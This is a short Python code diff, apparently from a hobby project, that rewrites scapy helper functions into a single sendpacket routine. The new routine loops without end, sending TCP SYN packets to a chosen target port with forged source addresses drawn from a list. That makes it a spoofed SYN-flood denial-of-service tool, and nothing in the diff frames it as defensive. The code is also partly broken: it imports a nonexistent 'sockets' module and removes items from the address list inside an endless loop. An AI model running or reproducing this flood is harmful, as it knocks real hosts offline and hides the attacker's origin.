@@ -1,38 +1,17 @@
 #!/usr/bin/env python
 
-def setpacketinfoip(Ip_range,destination):
-    from scapy.all import IP
+def sendpacket(Ip_range, destination, targetport, silva):
+    from scapy.all import IP, TCP
     import random
+    import sockets
     if type(Ip_range) != list:
-       sourceip = Ip_range
-       targetip = destination
-       Ip_packet = IP()
-       Ip_packet.src = str(sourceip)
-       Ip_packet.dst = str(targetip)
-       Ip_packet.proto = 6
-       return Ip_packet
-       
-    
-    else:
-       
-       sourceip = random.choice(Ip_range)
-       targetip = destination
-       Ip_packet = IP()
-       Ip_packet.src = sourceip
-       Ip_packet.dst = targetip
-       Ip_packet.proto = 6
-       return Ip_packet
-      
-
-       
-def setpacketinfotcp(targetport):
-    from scapy.all import TCP
-    import random
-    Tcp_packet = TCP()
-    Tcp_packet.dport = int(targetport)
-    Tcp_packet.sport = int(random.randint(1, 65535))
-    Tcp_packet.seq = int(random.randint(1,65535))
-    Tcp_packet.window = int(random.randint(1, 65535))
-    Tcp_packet.flags = "S"
-    return Tcp_packet
-    	
+       while 0 == 0:
+             silva.send(bytes(IP(dst = str(destination), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
+             print 'package sent'       
+    else: 
+       while 0 == 0:
+             source = random.choice(Ip_range)
+             silva.send(bytes(IP(dst = str(destination), src = str(source), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
+             Ip_range.remove(source)
+             print 'package sent'
+             
